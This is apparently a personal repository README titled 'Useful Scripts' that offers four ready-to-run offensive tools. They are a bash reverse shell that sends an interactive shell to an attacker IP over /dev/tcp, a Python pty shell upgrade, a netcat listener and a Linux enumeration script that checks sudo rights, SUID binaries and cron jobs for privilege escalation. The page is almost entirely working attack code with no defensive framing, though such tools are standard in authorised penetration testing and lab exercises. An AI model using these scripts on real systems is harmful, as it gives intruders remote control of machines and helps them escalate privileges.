<div align="center">

# 🛠️ Useful Scripts

<img src="https://img.shields.io/badge/Type-Automation-3498db?style=for-the-badge" />

</div>

---

## 🐚 Reverse Shell Script (Bash)

```bash
#!/bin/bash
# ============================================
# 🐚 reverse-shell.sh
# Quick reverse shell generator
# Usage: ./reverse-shell.sh <attacker_ip> <port>
# ============================================

ATTACKER_IP=$1
PORT=$2

if [ -z "$ATTACKER_IP" ] || [ -z "$PORT" ]; then
    echo "❌ Usage: $0 <attacker_ip> <port>"
    exit 1
fi

echo "🚀 Sending reverse shell to $ATTACKER_IP:$PORT..."
bash -i >& /dev/tcp/$ATTACKER_IP/$PORT 0>&1
```

---

## 🐍 Python TTY Upgrade Script

```python
#!/usr/bin/env python3
# ============================================
# 🐍 tty-upgrade.py
# Upgrade basic shell to full TTY
# Usage: python3 tty-upgrade.py
# ============================================

import pty
import os

print("🚀 Upgrading to full TTY shell...")
pty.spawn("/bin/bash")
```

---

## 🎯 Netcat Listener Script

```bash
#!/bin/bash
# ============================================
# 🎯 listener.sh
# Quick netcat listener
# Usage: ./listener.sh <port>
# ============================================

PORT=${1:-4444}

echo "🎯 Listening on port $PORT..."
echo "💡 Press Ctrl+C to stop"
nc -lvnp $PORT
```

---

## 🔍 Auto Enumeration Script

```bash
#!/bin/bash
# ============================================
# 🔍 auto-enum.sh
# Quick Linux enumeration
# ============================================

echo "╔══════════════════════════════════════════╗"
echo "║         🔍 BASIC ENUMERATION             ║"
echo "╚══════════════════════════════════════════╝"
whoami
id
uname -a
pwd
ls -la

echo ""
echo "╔══════════════════════════════════════════╗"
echo "║         🌐 NETWORK INFO                  ║"
echo "╚══════════════════════════════════════════╝"
ip addr 2>/dev/null || ifconfig

echo ""
echo "╔══════════════════════════════════════════╗"
echo "║         👑 SUDO PRIVILEGES               ║"
echo "╚══════════════════════════════════════════╝"
sudo -l

echo ""
echo "╔══════════════════════════════════════════╗"
echo "║         🔎 SUID BINARIES                 ║"
echo "╚══════════════════════════════════════════╝"
find / -perm -4000 2>/dev/null

echo ""
echo "╔══════════════════════════════════════════╗"
echo "║         ⏰ CRON JOBS                     ║"
echo "╚══════════════════════════════════════════╝"
cat /etc/crontab

echo ""
echo "╔══════════════════════════════════════════╗"
echo "║         🏠 HOME DIRECTORIES              ║"
echo "╚══════════════════════════════════════════╝"
ls -la /home/
```

---

<div align="center">

**Made with 💜 by Swoyon**

</div>
